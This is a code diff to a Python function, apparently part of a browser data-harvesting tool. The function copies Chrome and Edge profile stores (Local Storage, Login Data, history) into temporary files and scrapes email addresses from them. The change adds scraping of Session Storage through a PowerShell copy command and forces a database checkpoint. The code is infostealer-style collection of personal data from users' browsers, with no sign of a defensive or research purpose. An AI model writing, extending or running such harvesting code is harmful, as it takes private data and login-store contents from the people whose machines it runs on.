@@ -85,12 +85,33 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                     value_str = value.decode('utf-8', errors='ignore')
                     decoded = f"{key_str} {value_str}"
                     # print(decoded)
-                    print(value_str)
+                    #print(value_str)
                     emails.extend(re.findall(email_pattern, key_str))
                     emails.extend(re.findall(email_pattern, value_str))
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING LOCAL STORAGE : {e}")
+
+        ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
+        tssDatPath = os.path.join(os.getenv('TEMP'), f"ssDat_{USERNAME}_{profile_name}_{browser_name}")
+        if os.path.isdir(ssDatPath):
+            try:
+                print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
+                os.system(f"powershell copy-item -path '{ssDatPath}' -destination '{tssDatPath}' -force -recurse")
+                db = plyvel.DB(str(tssDatPath), create_if_missing=False)
+                for key, value in db:
+                    key_str = key.decode('utf-8', errors='ignore')
+                    if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                        value = snappy.uncompress(value)
+                    value_str = value.decode('utf-8', errors='ignore')
+                    decoded = f"{key_str} {value_str}"
+                    #print(decoded)
+                    #print(value_str)
+                    emails.extend(re.findall(email_pattern, key_str))
+                    emails.extend(re.findall(email_pattern, value_str))
+                db.close()
+            except Exception as e:
+                print(f"ERROR PARSING SESSION STORAGE : {e}")
 
         lDatPath = os.path.join(chrome_path, profile, 'Login Data')
         tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat_{USERNAME}_{profile_name}_{browser_name}.db")
@@ -118,6 +139,8 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
             result = cur.fetchone()
             if(result[0] != "ok"):
                 cur.execute("PRAGMA journal_mode = WAL;")
+                cur.execute("PRAGMA wal_checkpoint(FULL);")
+                conn.commit()
 
             cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
             for val in cur.fetchall():
